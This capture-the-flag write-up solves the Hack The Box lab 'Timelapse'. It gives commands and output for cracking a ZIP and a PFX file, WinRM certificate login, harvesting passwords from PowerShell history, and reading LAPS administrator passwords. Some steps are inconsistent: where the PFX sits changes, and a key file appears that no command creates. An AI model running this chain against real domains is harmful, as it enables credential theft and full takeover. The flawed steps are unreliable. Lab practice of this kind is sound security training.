#Windows #ActiveDirectory #SMB #PFX #john #pfx2john #WinRM #SSL #PowerShellHistory #LAPS

## Overview

Timelapse is an easy Windows Active Directory box with no exploits anywhere. A guest-accessible SMB share contains a password-protected ZIP and a `.pfx` certificate file. Both crack with john. The certificate and private key extracted from the PFX authenticate to WinRM over SSL as `legacyy`. PowerShell command history in `legacyy`'s profile reveals credentials for `svc_deploy`, which is a member of the `LAPS_Readers` group. LAPS is queried for the DC's local administrator password, and that gives full access.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb)
445/tcp  open  microsoft-ds?
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb)
Service Info: Host: DC01; OS: Windows
```

Classic DC port profile. The domain is `timelapse.htb`.

### SMB Enumeration

null access yields little. The guest account can list shares, and one is non-standard:

```sh
smbclient //timelapse.htb/Shares -U 'guest'
```

The `Shares` share contains a password-protected ZIP (`winrm_backup.zip`) and a `.pfx` file (`legacyy_dev_auth.pfx`).

## Foothold

### Cracking the ZIP and PFX

Convert the ZIP to a john hash and crack it:

```sh
zip2john winrm_backup.zip > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
supremelegacy
```

The ZIP contents aren't the prize. The `.pfx` file inside the share is. Convert it to a john hash:

```sh
pfx2john legacyy_dev_auth.pfx > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
thuglegacy
```

> **What a PFX file is:** a `.pfx` (PKCS#12) file bundles a private key and one or more certificates into a single encrypted archive. It's commonly used to export a certificate with its key from a Windows certificate store. With the password, you can extract both components. Here, the certificate was used for WinRM client authentication, meaning you authenticate to the service by presenting this certificate rather than a username/password.

Extract the private key and certificate:

```sh
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```

Connect to WinRM with certificate authentication (`-S` for SSL is required):

```sh
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

Shell obtained as `legacyy`. User flag at `C:\Users\legacyy\Desktop\user.txt`.

## Privilege Escalation

### PowerShell History → svc_deploy

PowerShell saves command history to `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. Legacyy's history contains a credential assignment:

```powershell
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl ...
```

Credentials recovered:

```
svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
```

> **Why PowerShell history leaks credentials:** `PSReadLine` saves every command typed in an interactive session to a plaintext file, persistent across sessions. Commands that inline credentials, like `ConvertTo-SecureString 'password' -AsPlainText -Force`, are stored verbatim. This is one of the most productive files to check on Windows boxes.

Log in as `svc_deploy`:

```sh
evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

### LAPS_Readers → Administrator

`svc_deploy` is a member of `TIMELAPSE\LAPS_Readers`. LAPS (Local Administrator Password Solution) has the DC managing local admin passwords for domain-joined computers. The `LAPS_Readers` group can read those passwords via the `ms-mcs-admpwd` AD attribute:

```powershell
Get-ADComputer DC01 -property 'ms-mcs-admpwd'

ms-mcs-admpwd : GI]K;&&l2$!6H-z68x(PicE7
```

> **Why LAPS_Readers is significant:** LAPS rotates local administrator passwords and stores them encrypted in Active Directory. Members of the designated reader group can query that attribute. If any of those accounts are compromised, you get the current local admin password for every LAPS-managed computer, which typically includes all Domain Controllers.

Local administrator credentials:

```
administrator : GI]K;&&l2$!6H-z68x(PicE7
```

## Root

```sh
evil-winrm -i timelapse.htb -u administrator -p 'GI]K;&&l2$!6H-z68x(PicE7' -S
```

```powershell
*Evil-WinRM* PS C:\users\TRX\desktop> type root.txt
‹redacted›
```

## Takeaways

- **Guest SMB access is worth a thorough look.** A non-default share with cryptographic material is a direct foothold path.
- **PFX files can substitute for password-based authentication.** If a cert-auth endpoint is available and a PFX is crackable, it bypasses the need for a plaintext password entirely.
- **PSReadLine history is always worth reading.** It persists across reboots and captures every interactive command, including inline credential assignments.
- **LAPS_Readers gives the rotating local admin password.** One compromised LAPS reader account reads every managed machine's current admin password.
